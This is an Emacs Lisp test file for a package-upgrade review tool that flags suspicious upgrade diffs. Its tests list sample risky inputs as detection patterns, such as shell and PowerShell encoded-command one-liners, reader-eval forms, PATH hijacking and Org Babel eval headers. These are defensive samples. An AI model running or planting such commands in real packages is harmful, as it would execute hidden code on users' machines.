(ert-deftest package-upgrade-guard-documentation-classification-is-strict ()
  "Executable suffixes must not be accepted because of a documentation stem."
  (dolist (file '("README.el" "LICENSE.so" "CHANGELOG.sh"))
    (should-not
     (package-upgrade-guard--security-documentation-file-p file)))
  (dolist (file '("README" "LICENSE" "guide.md" "NEWS.org"))
    (should (package-upgrade-guard--security-documentation-file-p file))))

(ert-deftest package-upgrade-guard-security-review-blocks-mode-change ()
  "A documentation-only executable-mode change must require review."
  (let ((review
         (package-upgrade-guard--classify-git-security-changes
          "M\tREADME.md" "0\t0\tREADME.md"
          (concat "diff --git a/README.md b/README.md\n"
                  "old mode 100644\nnew mode 100755\n"))))
    (should-not (plist-get review :safe))
    (should (member "file mode changed" (plist-get review :reasons)))))

(ert-deftest package-upgrade-guard-security-review-blocks-delete ()
  "Deleted files must require manual approval."
  (let ((old-dir (make-temp-file "package-guard-delete-old-" t))
        (new-dir (make-temp-file "package-guard-delete-new-" t))
        (package-upgrade-guard-diff-mode 'security))
    (unwind-protect
        (progn
          (write-region "Documentation\n" nil
                        (expand-file-name "README.md" old-dir) nil 'silent)
          (with-temp-buffer
            (let ((review (package-upgrade-guard--generate-diff
                           old-dir new-dir)))
              (should (= 1 (plist-get review :changes)))
              (should (member "file deleted: README.md"
                              (plist-get review :reasons))))))
      (delete-directory old-dir t)
      (delete-directory new-dir t))))

(ert-deftest package-upgrade-guard-security-review-blocks-binary-change ()
  "Binary changes must require manual approval."
  (let ((old-dir (make-temp-file "package-guard-binary-old-" t))
        (new-dir (make-temp-file "package-guard-binary-new-" t))
        (package-upgrade-guard-diff-mode 'security))
    (unwind-protect
        (progn
          (write-region (unibyte-string 0 1) nil
                        (expand-file-name "payload.bin" old-dir) nil 'silent)
          (write-region (unibyte-string 0 2) nil
                        (expand-file-name "payload.bin" new-dir) nil 'silent)
          (with-temp-buffer
            (let ((review (package-upgrade-guard--generate-diff
                           old-dir new-dir)))
              (should (= 1 (plist-get review :changes)))
              (should (member "binary file changed: payload.bin"
                              (plist-get review :reasons))))))
      (delete-directory old-dir t)
      (delete-directory new-dir t))))

(ert-deftest package-upgrade-guard-git-policy-blocks-binary-and-rename ()
  "Git binary and rename changes must require manual approval."
  (dolist (review
           (list
            (package-upgrade-guard--classify-git-security-changes
             "M\timage.png" "-\t-\timage.png")
            (package-upgrade-guard--classify-git-security-changes
             "R100\tREADME.md\tMANUAL.md" "0\t0\tMANUAL.md")))
    (should-not (plist-get review :safe))))

(ert-deftest package-upgrade-guard-security-diff-detects-expanded-apis ()
  "Security patterns should cover indirect execution and persistence APIs."
  (dolist (line (list "+(shell-command-to-string command)"
                      "+(process-lines \"git\" \"status\")"
                      "+(module-load module-file)"
                      "+(load-theme theme)"
                      "+(call-interactively command)"
                      "+(execute-kbd-macro macro)"
                      "+(add-hook 'after-init-hook callback)"
                      "+;;;###autoload"
                      (concat "+;; Local "
                              "Variables: eval: (do-dangerous-thing)")))
    (should (package-upgrade-guard--security-diff-line-p line))))

(ert-deftest package-upgrade-guard-security-diff-detects-core-missed-apis ()
  "Security patterns should cover high-impact built-in API variants."
  (dolist (line '("+(call-process-region start end program)"
                  "+(eval-after-load feature form)"
                  "+(with-eval-after-load feature (activate))"
                  "+(set-process-sentinel process callback)"
                  "+(make-thread callback)"
                  "+(package-delete descriptor)"
                  "+(package-vc-checkout spec)"
                  "+(set-default-file-modes #o777)"))
    (should (package-upgrade-guard--security-diff-line-p line))))

(ert-deftest package-upgrade-guard-security-diff-detects-additional-side-effects ()
  "Security patterns should cover additional execution and file APIs."
  (dolist (line '("+(process-file-shell-command \"id\")"
                  "+(basic-save-buffer)"
                  "+(make-temp-file \"payload\")"
                  "+(run-hooks 'after-init-hook)"
                  "+(run-hook-with-args 'hook payload)"
                  "+(org-babel-execute-src-block)"))
    (should (package-upgrade-guard--security-diff-line-p line))))

(ert-deftest package-upgrade-guard-security-review-blocks-property-line ()
  "A -*- property line in documentation must be highlighted for review."
  (let ((content "-*- mode: emacs-lisp -*-\nDocumentation\n"))
    (should (package-upgrade-guard--security-active-document-p content))
    (should
     (package-upgrade-guard--security-diff-line-p
      "+-*- mode: emacs-lisp -*-"))))

(ert-deftest package-upgrade-guard-security-diff-detects-risk-api-families ()
  "Security patterns should cover risky APIs from each supported family."
  (dolist (line
           (list
            "+(shell-command-on-region (point-min) (point-max) \"sh\")"
            "+(load-with-code-conversion \"payload.el\" \"payload.el\" nil nil)"
            "+(make-pipe-process :name \"payload\" :command command)"
            "+(process-send-string process payload)"
            "+(url-queue-retrieve url callback)"
            "+(request endpoint)"
            "+(insert-file-contents \"/ssh:host:/tmp/payload\")"
            "+(file-local-copy remote-file)"
            "+(customize-set-variable variable value)"
            "+(kill-emacs)"
            "+(set-file-extended-attributes file attributes)"
            "+(setenv \"PATH\" attacker-path)"
            "+(customize-save-variable variable value)"
            "+(keymap-global-set \"C-x C-c\" callback)"
            "+(run-at-time 0 nil callback)"
            "+(server-eval-at server form)"))
    (should (package-upgrade-guard--security-diff-line-p line))))

(ert-deftest package-upgrade-guard-review-no-changes-requires-complete-zero-diff ()
  "Only complete reviews with zero actual differences may skip prompting."
  (should
   (package-upgrade-guard--review-no-changes-p
    '(:matches 0 :changes 0 :complete t)))
  (should-not
   (package-upgrade-guard--review-no-changes-p
    '(:matches 0 :changes 1 :complete t)))
  (should-not
   (package-upgrade-guard--review-no-changes-p
    '(:matches 0 :changes 0 :complete nil))))

(ert-deftest package-upgrade-guard-security-diff-detects-additional-vectors ()
  "Security patterns should cover IPC, interpreters, and reader evaluation."
  (dolist (content '("(dbus-call-method :system service path interface method)"
                     "bash -c 'printf payload'"
                     "python3 -c 'import os'"
                     "perl -e 'system q(id)'"
                     "pwsh -EncodedCommand payload"
                     "#.(progn payload)"))
    (should (package-upgrade-guard--security-content-p content))))

(ert-deftest package-upgrade-guard-security-review-blocks-org-header-properties ()
  "Org Babel configuration directives must be marked for manual review."
  (dolist (content '("#+PROPERTY: header-args :eval yes"
                     "#+HEADER: :var payload=(shell-command \"id\")"
                     "#+HEADERS: :results silent"))
    (should (package-upgrade-guard--security-active-document-p content))
    (should (package-upgrade-guard--security-content-p content))))

(ert-deftest package-upgrade-guard-git-policy-blocks-unsafe-new-file-mode ()
  "New executable files and links must require manual approval."
  (dolist (mode '("100755" "120000"))
    (let ((review
           (package-upgrade-guard--classify-git-security-changes
            "A\tREADME.md" "1\t0\tREADME.md"
            (format "new file mode %s\n" mode))))
      (should-not (plist-get review :safe))
      (should (member (format "unsafe new file mode: %s" mode)
                      (plist-get review :reasons)))))
  (should
   (plist-get
    (package-upgrade-guard--classify-git-security-changes
     "A\tREADME.md" "1\t0\tREADME.md" "new file mode 100644\n")
    :safe)))

(ert-deftest package-upgrade-guard-security-review-blocks-new-executable-doc ()
  "A new executable documentation file must require manual approval."
  (let ((old-dir (make-temp-file "package-guard-exec-old-" t))
        (new-dir (make-temp-file "package-guard-exec-new-" t))
        (package-upgrade-guard-diff-mode 'security))
    (unwind-protect
        (let ((file (expand-file-name "README.md" new-dir)))
          (write-region "Documentation\n" nil file nil 'silent)
          (set-file-modes file #o755)
          (with-temp-buffer
            (let ((review (package-upgrade-guard--generate-diff
                           old-dir new-dir)))
              (should (= 1 (plist-get review :changes)))
              (should (member "new executable file: README.md"
                              (plist-get review :reasons))))))
      (delete-directory old-dir t)
      (delete-directory new-dir t))))

(ert-deftest package-upgrade-guard-file-type-change-is-not-no-op ()
  "Replacing an empty directory with a file must never be auto-approved."
  (dolist (mode '(all security))
    (let ((old-dir (make-temp-file "package-guard-type-old-" t))
          (new-dir (make-temp-file "package-guard-type-new-" t))
          (package-upgrade-guard-diff-mode mode))
      (unwind-protect
          (progn
            (make-directory (expand-file-name "payload" old-dir))
            (write-region "(message \"payload\")" nil
                          (expand-file-name "payload" new-dir)
                          nil 'silent)
            (with-temp-buffer
              (let ((review
                     (package-upgrade-guard--generate-diff old-dir new-dir)))
                (should (= 1 (plist-get review :changes)))
                (should-not
                 (package-upgrade-guard--review-no-changes-p review))
                (should (string-match-p
                         "File type changed: directory -> file"
                         (buffer-string))))))
        (delete-directory old-dir t)
        (delete-directory new-dir t)))))

(ert-deftest package-upgrade-guard-review-file-count-limit-fails-closed ()
  "Archive review must reject trees beyond the configured file limit."
  (let ((old-dir (make-temp-file "package-guard-count-old-" t))
        (new-dir (make-temp-file "package-guard-count-new-" t))
        (package-upgrade-guard-max-review-files 0))
    (unwind-protect
        (progn
          (write-region "payload" nil (expand-file-name "payload" new-dir)
                        nil 'silent)
          (with-temp-buffer
            (should-error
             (package-upgrade-guard--generate-diff old-dir new-dir))))
      (delete-directory old-dir t)
      (delete-directory new-dir t))))

(ert-deftest package-upgrade-guard-total-diff-limit-fails-closed ()
  "Archive review must become incomplete when its total display limit is hit."
  (let ((old-dir (make-temp-file "package-guard-size-old-" t))
        (new-dir (make-temp-file "package-guard-size-new-" t))
        (package-upgrade-guard-max-total-diff-size 1))
    (unwind-protect
        (progn
          (write-region "payload" nil (expand-file-name "payload" new-dir)
                        nil 'silent)
          (with-temp-buffer
            (let ((review
                   (package-upgrade-guard--generate-diff old-dir new-dir)))
              (should-not (plist-get review :complete))
              (should (member "total diff exceeds the display limit"
                              (plist-get review :reasons))))))
      (delete-directory old-dir t)
      (delete-directory new-dir t))))

(ert-deftest package-upgrade-guard-built-in-policy-restores-after-reenable ()
  "Repeated activation must not overwrite the saved built-in review policy."
  (let ((package-review-policy 'original)
        (package-upgrade-guard-enabled t)
        (package-upgrade-guard--built-in-review-active nil)
        (package-upgrade-guard--saved-package-review-policy nil)
        (package-upgrade-guard--saved-package-review-policy-bound nil))
    (package-upgrade-guard--enable-built-in-review)
    (package-upgrade-guard--enable-built-in-review)
    (package-upgrade-guard--restore-built-in-review)
    (should (eq package-review-policy 'original))))

(ert-deftest package-upgrade-guard-enabled-setting-syncs-built-in-policy ()
  "Changing the enabled option must update an active built-in policy."
  (cl-progv '(package-review-policy
              package-upgrade-guard-mode
              package-upgrade-guard--built-in-review-active)
      '(t t t)
    (cl-letf (((symbol-function 'set-default) #'ignore))
      (package-upgrade-guard--set-enabled
       'package-upgrade-guard-enabled nil)
      (should-not (symbol-value 'package-review-policy))
      (package-upgrade-guard--set-enabled
       'package-upgrade-guard-enabled t)
      (should (symbol-value 'package-review-policy)))))

(ert-deftest package-upgrade-guard-vc-activation-failure-rolls-back-head ()
  "A failed VC activation must restore the commit present before merging."
  (let* ((pkg-dir (make-temp-file "package-guard-vc-rollback-" t))
         (pkg-desc (package-upgrade-guard-test--desc 'pkg '(2 0) pkg-dir))
         (key (package-desc-full-name pkg-desc))
         (head "original"))
    (unwind-protect
        (progn
          (puthash key "reviewed" package-upgrade-guard--reviewed-vc-commits)
          (cl-letf (((symbol-function 'package-upgrade-guard--git-upstream)
                     (lambda (_dir) "origin/main"))
                    ((symbol-function 'package-upgrade-guard--git-output)
                     (lambda (_dir &rest args)
                       (cond
                        ((equal (car args) "status") "")
                        ((equal args '("rev-parse" "origin/main")) "reviewed")
                        ((equal args '("rev-parse" "HEAD")) head))))
                    ((symbol-function 'call-process)
                     (lambda (&rest args)
                       (pcase (nth 4 args)
                         ("merge" (setq head "reviewed"))
                         ("reset" (setq head (nth 6 args))))
                       0))
                    ((symbol-function 'package-vc--unpack-1)
                     (lambda (&rest _args) (error "activation failed"))))
            (should-error
             (package-upgrade-guard--call-with-reviewed-vc-commit
              #'ignore pkg-desc pkg-desc))
            (should (equal head "original"))
            (should-not
             (gethash key package-upgrade-guard--reviewed-vc-commits))))
      (remhash key package-upgrade-guard--reviewed-vc-commits)
      (delete-directory pkg-dir t))))

(provide 'package-upgrade-guard-tests)

;;; package-upgrade-guard-tests.el ends here
